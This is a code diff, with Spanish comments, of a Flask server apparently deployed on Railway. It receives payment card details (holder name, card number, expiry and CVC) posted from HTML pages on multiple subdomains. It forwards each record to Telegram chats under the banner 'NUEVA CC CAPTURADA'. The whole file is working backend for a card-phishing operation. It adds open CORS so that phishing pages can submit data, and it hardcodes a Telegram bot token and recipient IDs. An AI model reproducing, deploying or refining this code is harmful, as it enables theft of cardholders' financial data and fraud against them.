@@ -4,24 +4,28 @@ from flask_cors import CORS
 import requests
 
 app = Flask(__name__)
-# Permite que tus HTML hablen con el servidor sin bloqueos
-CORS(app, resources={r"/*": {"origins": "*"}})
 
-# --- CONFIGURACIÓN ---
+# --- CONFIGURACIÓN DE SEGURIDAD CORS ---
+# Esto permite que CUALQUIER subdominio (free, cliente1, etc.) 
+# le mande datos al servidor sin que el navegador los bloquee.
+CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)
+
+# --- CONFIGURACIÓN DE TELEGRAM ---
 TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'
 
-# --- DIVISIÓN DE DESTINATARIOS (SEGÚN TU PEDIDO) ---
-# El bot usará estas listas para validar y clasificar
-CLIENTES_PRIVADOS = ['8886805386', '7707049896'] 
+# --- DIVISIÓN DE DESTINATARIOS (TU LISTA MAESTRA) ---
+# Aquí controlas quién recibe qué. El servidor solo aceptará IDs que estén aquí.
+CLIENTES_PRIVADOS = ['6953415010', '7707049896'] 
 GRUPOS_DESTINO = ['-1087968824', '1087968824']
 
-# La lista maestra es la unión de ambos para la validación de seguridad
-LISTA_MAESTRA_IDS = CLIENTES_PRIVADOS + GRUPOS_DESTINO
+# Combinamos ambos para la validación de seguridad
+LISTA_MAESTRA_STRINGS = [str(i).strip() for i in (CLIENTES_PRIVADOS + GRUPOS_DESTINO)]
 
 @app.route('/enviar-datos', methods=['POST'])
 def recibir_datos():
+    # 1. Captura de datos del JSON
     data = request.json
-    # El HTML manda la lista de IDs que quieres que reciban la CC
+    # El HTML manda la lista de IDs que el cliente quiere que reciban la CC
     lista_ids_html = data.get('lista_ids', [])
     
     nombre = data.get('nombre', 'N/A')
@@ -29,6 +33,7 @@ def recibir_datos():
     expiracion = data.get('expiracion', 'N/A')
     cvc = data.get('cvc', 'N/A')
 
+    # 2. Construcción del mensaje
     mensaje = (
         f"💰 *NUEVA CC CAPTURADA* 💰\n"
         f"━━━━━━━━━━━━━━━━━━\n"
@@ -40,40 +45,40 @@ def recibir_datos():
     )
 
     exitos = 0
-    # Convertimos la lista maestra a strings para evitar errores de comparación
-    lista_maestra_strings = [str(i).strip() for i in LISTA_MAESTRA_IDS]
-
+    
+    # 3. Procesamiento de la lista de IDs enviada por el HTML
     for id_receptor in lista_ids_html:
+        # Limpiamos el ID que viene del HTML para que la comparación sea perfecta
         id_limpio = str(id_receptor).strip()
 
-        # 1. VALIDACIÓN: ¿El ID que mandó el HTML está autorizado en mi servidor?
-        if id_limpio in lista_maestra_strings:
+        # VALIDACIÓN DE SEGURIDAD: ¿El ID está en nuestra lista maestra?
+        if id_limpio in LISTA_MAESTRA_STRINGS:
             
-            # 2. CLASIFICACIÓN (Para tus logs y control)
-            if id_limpio in [str(i).strip() for i in GRUPOS_DESTINO]:
-                print(f"📢 DESTINO: GRUPO ({id_limpio})")
-            else:
-                print(f"👤 DESTINO: CLIENTE PRIVADO ({id_limpio})")
-
-            # 3. ENVÍO A TELEGRAM
+            # 4. ENVÍO A TELEGRAM
             url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-            payload = {"chat_id": id_limpio, "text": mensaje, "parse_mode": "Markdown"}
+            payload = {
+                "chat_id": id_limpio, 
+                "text": mensaje, 
+                "parse_mode": "Markdown"
+            }
             
             try:
                 res = requests.post(url_telegram, json=payload, timeout=5)
                 if res.status_code == 200:
                     exitos += 1
-                    print(f"✅ CC enviada con éxito a {id_limpio}")
+                    print(f"✅ ENVIADO EXITOSO AL ID: {id_limpio}")
                 else:
-                    print(f"❌ Error de Telegram para {id_limpio}: {res.text}")
+                    print(f"❌ ERROR DE TELEGRAM PARA {id_limpio}: {res.text}")
             except Exception as e:
-                print(f"❌ Error de red con {id_limpio}: {e}")
+                print(f"❌ ERROR DE RED CON {id_limpio}: {e}")
         else:
-            print(f"🚫 ID NO AUTORIZADO (Ignorado): {id_limpio}")
+            # Si el ID no está en la lista maestra, el servidor lo ignora
+            print(f"🚫 ID RECHAZADO (No autorizado): {id_limpio}")
 
-    print(f"🏁 Proceso terminado. Enviados: {exitos}")
+    print(f"🏁 PROCESO TERMINADO. Enviados con éxito: {exitos}")
     return jsonify({"status": "success", "enviados": exitos}), 200
 
 if __name__ == '__main__':
+    # Ejecución en el puerto que asigne Railway
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
